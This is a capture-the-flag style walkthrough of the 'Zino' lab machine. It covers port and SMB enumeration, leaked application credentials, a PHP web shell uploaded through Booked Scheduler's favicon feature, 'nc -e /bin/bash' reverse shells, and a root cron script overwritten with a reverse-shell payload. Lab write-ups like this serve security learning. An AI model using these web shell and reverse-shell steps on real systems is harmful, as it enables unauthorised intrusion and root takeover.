# Zino Overview

## Machine Details

|IP|Hostname|Operating System|
|---|---|---|
|192.168.x.64|Zino|Linux|

## Path to Exploitation
This is a Linux machine running an HTTP server and has SSH available. We will identify the vulnerable web-application and using a publicly available exploit and default credentials we obtain a web-shell and get command execution. Once on the machine we identify a scheduled script that takes uploaded images and executes the exiftools command on them. We can leverage this by uploading a .jpg file with an embedded reverse shell payload.

# Enumeration

## Full Port Scan

```bash
$ nmap -p- -Pn -oA nmap/full-port --open 192.168.200.64
```

Results:

|Port|Service|
|----|-------|
|21|ftp|
|22|ssh|
|139|netbios-ssn|
|445|microsoft-ds|
|3306|mysql|
|8003|mcreport|

## Service Scan

```bash
$ nmap -p 21,22,139,445,3306,8003 -Pn -sC -sV -oA nmap/service-scan 192.168.200.64
```

Results:

|Port|Service|Version|
|----|-------|--------|
|21|ftp|vsftpd 3.0.3|
|22|ssh|OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)|
|139|netbios-ssn|smbd 3.X - 4.X|
|445|microsoft-ds|smbd 4.9.5-Debian|
|3306|mysql||
|8003|http|Apache httpd 2.4.38|

# SMB Enumeration

## SMB Scan

```bash
nmap -p 139,445 --script=smb-vuln* 192.168.200.64 -Pn -oA nmap/smb-scan
```

Results:

```cmd
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false
```

No applicable vulnerabilities, but we have gathered more information from the previous service scan

```cmd
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2022-06-09T20:21:56-04:00
```
## SMB Share Enumeration

Using enum4linux we see that the host does not accept null sessions

```cmd
 ======================================= 
|    Session Check on 192.168.49.200    |
 ======================================= 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

We can try enumeration the shares with the computer name 'zino' with no password

![SMB Shares](/assets/ProvingGrounds/Zino/smb-shares.png "SMB Shares")

We see that there is a directory called zino, we can try to access that share.

![SMB Content](/assets/ProvingGrounds/Zino/smb-content.png "SMB Content")

It appears that this is the home directory of the zino user.

## File Enumeration

The content of the auth.log file provides us with a valid username

![Valid Username](/assets/ProvingGrounds/Zino/username.png "Valid Username")

In the misc.log file we find application credentials

![App Creds](/assets/ProvingGrounds/Zino/app-creds.png "App Creds")

admin:adminadmin

These credentials allow us to login to application running on the HTTP Server

![Logged In](/assets/ProvingGrounds/Zino/loggedin.png "Logged In")

# Website Enumeration

There is a /booked/ directory on the site

![/booked](/assets/ProvingGrounds/Zino/site.png "/booked")

which leads to the following login page

![Login Page](/assets/ProvingGrounds/Zino/loggin-page.png "Login Page")

We also see the software version near the bottom of the page

![App Version](/assets/ProvingGrounds/Zino/app-version.png "App Version")

This version is vulnerable to an [Authenticated RCE](https://www.exploit-db.com/exploits/50594)

With the credentials identified from enumerating the SMB share 
````
(admin:adminadmin)
````

# Exploitation

 We can attempt to exploit this service with the RCE exploit.

When using the exploit, I was unable to successfully exploit the RCE, but followed the steps outlined [here](https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF)

## Gaining a Webshell

1. Navigate to: http://192.168.200.64:8003/booked/Web/admin/manage_theme.php

![Upload Page](/assets/ProvingGrounds/Zino/uploads.png "Upload Page")

2. Create the rce.php file with the following content:

```bash
<?php system($_GET['cmd']); ?>
```

3. Upload the php file to the favicon section of the site

4. navigate to http://192.168.200.64:8003/booked/Web/custom-favicon.php?cmd=whoami

![Web Shell](/assets/ProvingGrounds/Zino/web-shell.png "Web Shell")

## Shell on Zino

Using the webshell we identify that nc is on the host.

![Identify nc](/assets/ProvingGrounds/Zino/nc.png "Identify nc")

We can use that to get our reverse shell. Use the following command to launch our reverse shell:

```bash
nc 192.168.49.200 8003 -e /bin/bash
```

Checking on our listener we see the connection come through

![Reverse Shell](/assets/ProvingGrounds/Zino/reverse-shell.png "Reverse Shell")

# Privilege Escalation

Linpeas has identified a potential priv esc in a cron job running in /var/www/html/booked

![Vulnerable Cron](/assets/ProvingGrounds/Zino/vuln-cron.png "Vulnerable Cron")

We can modify the content of the file to be the following:

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('nc -e /bin/bash 192.168.49.200 8003')
except:
        print 'ERROR...'
sys.exit(0)
```

and copy it to  /var/www/html/booked/cleanup.py and setup our listener. After a while we see a connection and we confirm we are running as root
